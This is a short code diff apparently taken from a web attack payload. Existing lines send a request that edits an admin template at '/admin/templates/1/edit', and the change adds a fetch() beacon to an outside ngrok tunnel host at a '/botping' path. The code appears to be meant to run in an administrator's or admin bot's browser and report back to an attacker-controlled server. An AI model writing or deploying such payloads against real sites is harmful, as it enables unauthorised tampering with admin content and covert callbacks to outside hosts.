@@ -7,3 +7,5 @@ fetch("/admin/templates/1/edit", {
     "content-type": "application/x-www-form-urlencoded"
   }
 })
+
+fetch("https://eaf3-195-113-197-234.ngrok-free.app/botping")
